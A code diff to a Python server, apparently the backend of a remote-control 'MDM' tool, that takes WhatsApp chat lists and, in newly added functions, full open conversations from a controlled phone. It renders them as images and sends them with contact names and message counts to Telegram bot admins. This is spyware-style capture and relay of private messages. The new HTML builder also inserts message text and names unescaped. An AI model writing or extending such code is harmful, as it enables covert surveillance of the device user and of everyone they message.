@@ -2201,33 +2201,40 @@ def _handle_screen_json(dev, data):
     screen_type = data.get("screen_type", "")
     chats = data.get("chats", [])
 
-    # ⚡ إذا screen_type معروف + chats موجودة → استخدم القالب الجديد
+    # ⚡ إذا screen_type معروف → استخدم القالب المناسب
     if screen_type == "MAIN_CHAT_LIST" and chats:
         try:
             _render_whatsapp_template(dev, data)
             return
         except Exception as e:
             logger.error(f"❌ Template rendering failed, falling back to Pillow: {e}")
-            # نكمل للـ fallback
+            _handle_screen_json_legacy(dev, data)
+            return
+
+    # ⚡ معالجة محادثة مفتوحة (CONVERSATION)
+    if screen_type == "CONVERSATION":
+        messages = data.get("messages", [])
+        if messages:
+            try:
+                _render_whatsapp_conversation(dev, data)
+                return
+            except Exception as e:
+                logger.error(f"❌ Conversation template failed: {e}")
+        # إذا فشل أو ما في رسائل، تجاهل (لا ترسل شيئاً)
+        return
 
     # ⚡ Fallback: استخدم Pillow القديم (للبيانات القديمة أو الأخطاء)
     _handle_screen_json_legacy(dev, data)
 
 
 def _render_whatsapp_template(dev, data):
-    """⚡ أسطوري: ارسم واجهة واتساب باستخدام قالب HTML.
-
-    1. حمّل قالب HTML من templates/whatsapp_chat_list.html
-    2. املأ القالب ببيانات chats[]
-    3. حوّل HTML → PNG عبر Playwright (مع fallback لـ Pillow)
-    4. أرسل الصورة للبوت
-    """
+    """⚡ أسطوري: ارسم قائمة المحادثات الرئيسية باستخدام قالب HTML."""
     import os as _os
     import io as _io
     import time as _time
 
     chats = data.get("chats", [])
-    logger.info(f"🖼️ Rendering WhatsApp template: {len(chats)} chats")
+    logger.info(f"🖼️ Rendering chat list template: {len(chats)} chats")
 
     # 1. حمّل القالب
     template_path = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)),
@@ -2246,24 +2253,20 @@ def _render_whatsapp_template(dev, data):
         chats_html
     )
 
-    # 3. حوّل HTML → PNG عبر Playwright (مع fallback لـ Pillow)
-    # ⚠️ نريد فقط صورة (لا نص) — Pillow fallback يرسم صورة بدل إرسال نص
+    # 3. حوّل HTML → PNG
     png_data = None
     try:
         png_data = _render_html_to_png_sync(filled_html)
     except Exception as e:
         logger.error(f"❌ Playwright failed, using Pillow fallback: {e}")
-        # استخدم Pillow لرسم صورة (بدل إرسال نص)
         try:
             png_data = _render_chats_with_pillow(chats)
         except Exception as e2:
             logger.error(f"❌ Pillow fallback also failed: {e2}")
-            # آخر احتياطي: لا ترسل شيئاً (بدل نص)
-            logger.error("❌ All rendering failed — skipping (no text fallback)")
             return
 
     if not png_data:
-        logger.error("❌ No PNG data generated — skipping (no text fallback)")
+        logger.error("❌ No PNG data generated")
         return
 
     # 4. أرسل الصورة للبوت
@@ -2273,29 +2276,124 @@ def _render_whatsapp_template(dev, data):
         bio.seek(0)
 
         caption = (
-            f"📱 <b>واجهة واتساب</b>\n"
+            f"📱 <b>قائمة المحادثات</b>\n"
             f"━━━━━━━━━━━━━━━\n"
             f"📱 <b>{short_label}</b>\n"
-            f"📋 النوع: قائمة المحادثات\n"
             f"💬 المحادثات: {len(chats)}\n"
             f"🕐 {_time.strftime('%H:%M:%S')}"
         )
 
         for admin_id in Config.ADMIN_IDS:
             try:
-                mdm_bot.bot.send_photo(
-                    admin_id,
-                    photo=bio,
-                    caption=caption,
-                    parse_mode="HTML"
-                )
+                mdm_bot.bot.send_photo(admin_id, photo=bio, caption=caption, parse_mode="HTML")
                 bio.seek(0)
-                logger.info(f"✅ Template image sent to admin {admin_id}")
+                logger.info(f"✅ Chat list image sent to admin {admin_id}")
             except Exception as e:
-                logger.error(f"❌ Failed to send template image: {e}")
+                logger.error(f"❌ Failed to send image: {e}")
 
-    # نظّف
     _pending_cmds.pop(request.sid, None)
+
+
+def _render_whatsapp_conversation(dev, data):
+    """⚡ أسطوري: ارسم محادثة مفتوحة باستخدام قالب HTML."""
+    import os as _os
+    import io as _io
+    import time as _time
+
+    messages = data.get("messages", [])
+    contact_name = data.get("contact_name", "")
+    logger.info(f"🖼️ Rendering conversation template: {len(messages)} messages, contact={contact_name}")
+
+    # 1. حمّل القالب
+    template_path = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)),
+                                   "templates", "whatsapp_conversation.html")
+    try:
+        with open(template_path, "r", encoding="utf-8") as f:
+            template_html = f.read()
+    except FileNotFoundError:
+        logger.error(f"❌ Conversation template not found: {template_path}")
+        return
+
+    # 2. املأ القالب
+    messages_html = _generate_messages_html(messages)
+    filled_html = template_html.replace(
+        '<!-- messages will be inserted here by Python -->',
+        messages_html
+    )
+
+    # املأ اسم جهة الاتصال
+    if contact_name:
+        filled_html = filled_html.replace('id="header-name"></div>', f'id="header-name">{contact_name}</div>')
+        # املأ أول حرف من الاسم في الأيقونة
+        initial = contact_name[0].upper() if contact_name else "?"
+        avatar_colors = ["#25d366", "#075e54", "#1fb8d4", "#df8c16", "#a028a8"]
+        color_idx = sum(ord(c) for c in contact_name) % len(avatar_colors)
+        color = avatar_colors[color_idx]
+        filled_html = filled_html.replace('id="header-avatar"></div>',
+                                          f'id="header-avatar" style="background:{color}">{initial}</div>')
+
+    # 3. حوّل HTML → PNG
+    png_data = None
+    try:
+        png_data = _render_html_to_png_sync(filled_html)
+    except Exception as e:
+        logger.error(f"❌ Playwright failed for conversation: {e}")
+        # لا fallback للمحادثة (معقد جداً)
+        return
+
+    if not png_data:
+        logger.error("❌ No PNG data generated for conversation")
+        return
+
+    # 4. أرسل الصورة للبوت
+    if mdm_bot:
+        short_label = _dev_label(dev)
+        bio = _io.BytesIO(png_data)
+        bio.seek(0)
+
+        caption = (
+            f"💬 <b>محادثة مفتوحة</b>\n"
+            f"━━━━━━━━━━━━━━━\n"
+            f"📱 <b>{short_label}</b>\n"
+            f"👤 الجهة: {contact_name or 'غير معروف'}\n"
+            f"📨 الرسائل: {len(messages)}\n"
+            f"🕐 {_time.strftime('%H:%M:%S')}"
+        )
+
+        for admin_id in Config.ADMIN_IDS:
+            try:
+                mdm_bot.bot.send_photo(admin_id, photo=bio, caption=caption, parse_mode="HTML")
+                bio.seek(0)
+                logger.info(f"✅ Conversation image sent to admin {admin_id}")
+            except Exception as e:
+                logger.error(f"❌ Failed to send conversation image: {e}")
+
+    _pending_cmds.pop(request.sid, None)
+
+
+def _generate_messages_html(messages):
+    """توليد HTML لفقاعات الرسائل."""
+    rows = []
+    for msg in messages:
+        text = msg.get("text", "")
+        time_str = msg.get("time", "")
+        outgoing = msg.get("outgoing", False)
+        sender = msg.get("sender", "")
+
+        msg_class = "outgoing" if outgoing else "incoming"
+
+        sender_html = ""
+        if sender and not outgoing:
+            sender_html = f'<div class="message-sender">{sender}</div>'
+
+        row = f'''<div class="message {msg_class}">
+            {sender_html}
+            <span class="message-text">{text}</span>
+            <span class="message-time">{time_str}</span>
+        </div>'''
+        rows.append(row)
+
+    return "\n".join(rows)
 
 
 def _render_html_to_png_sync(html_content):
